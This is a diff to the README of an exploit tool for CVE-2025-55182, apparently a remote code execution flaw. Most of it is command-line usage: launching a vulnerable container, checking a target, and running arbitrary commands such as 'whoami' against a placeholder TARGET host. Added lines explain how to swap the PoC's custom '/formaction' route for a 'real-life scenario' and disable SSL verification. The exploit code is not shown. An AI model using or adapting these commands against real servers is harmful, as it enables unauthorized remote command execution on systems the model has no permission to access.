@@ -18,11 +18,11 @@ docker run -d -p 3002:3002 --name cve-2025-55182 cve-2025-55182-vuln
 sleep 3
 
 # Check vulnerability
-python3 exploit.py --ip localhost --port 3002 --check
+python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --check
 
 # Execute commands
 python3 exploit.py --ip localhost --port 3002 --cmd "id"
-python3 exploit.py --ip localhost --port 3002 --cmd "whoami"
+python3 exploit.py --ip localhost --port 3002 --cmd "whoami" --no-ssl-verify
 
 # Cleanup
 docker stop cve-2025-55182 && docker rm cve-2025-55182
@@ -31,6 +31,13 @@ docker stop cve-2025-55182 && docker rm cve-2025-55182
 ## Usage
 
 ```bash
+!!!Be aware about custom route: '/formaction'.
+# Custom route in initial PoC:
+https://github.com/ejpir/CVE-2025-55182-poc/blob/main/src/server.js
+
+'/formaction' - is the custom route for the POST request (multipart/form-data).
+This route should be replaced for real-life scenario.
+
 # Check vulnerability
 python3 exploit.py --ip TARGET --port 3002 --check
 
@@ -41,7 +48,7 @@ python3 exploit.py --ip TARGET --port 3002 --cmd "COMMAND"
 python3 exploit.py --url http://TARGET:3002 --code "Math.PI * 2"
 
 # Use custom endpoint
-python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami"
+python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami" --no-ssl-verify
 ```
 
 ## Checker with nuclei (no RCE, only with Math.PI)
